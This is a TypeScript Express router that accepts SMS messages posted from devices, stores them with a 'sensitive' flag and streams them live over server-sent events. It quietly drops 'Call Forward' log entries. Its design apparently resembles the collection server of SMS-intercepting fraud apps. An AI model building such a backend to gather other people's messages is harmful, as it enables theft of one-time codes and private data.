import { Router, type IRouter } from "express";
import { localDb } from "../lib/local-db";
import { sseEmit } from "../lib/sse";

const router: IRouter = Router();

router.get("/messages", async (req, res) => {
  const { userId, deviceId, appId } = req.query;
  const rows = await localDb.listMessages({
    appId: appId ? String(appId) : undefined,
    userId: !appId && userId ? String(userId) : undefined,
    deviceId: !appId && !userId && deviceId ? String(deviceId) : undefined,
  });
  res.json(rows);
});

router.post("/messages", async (req, res) => {
  const { appId, deviceId, userId, fromSender, fromNumber, body, isSensitive } = req.body as Record<string, unknown>;
  if (!appId || !deviceId || !fromNumber || !body) {
    res.status(400).json({ error: "appId, deviceId, fromNumber and body are required" });
    return;
  }
  // Call Forward system logs messages band karo — sirf real SMS allowed
  const senderStr = String(fromSender ?? "");
  if (senderStr.toLowerCase().startsWith("call forward")) {
    res.status(204).end(); // silently ignore
    return;
  }
  const uid = String(userId ?? `USR-${String(deviceId).slice(-6).toUpperCase()}`);
  const inserted = await localDb.createMessage({
    appId: String(appId),
    deviceId: String(deviceId),
    userId: uid,
    fromSender: String(fromSender ?? "Unknown"),
    fromNumber: String(fromNumber),
    body: String(body),
    isSensitive: Boolean(isSensitive ?? false),
  });
  sseEmit("message_added", { appId: String(appId), message: inserted });
  res.status(201).json({ ok: true, id: inserted.id });
});

export default router;
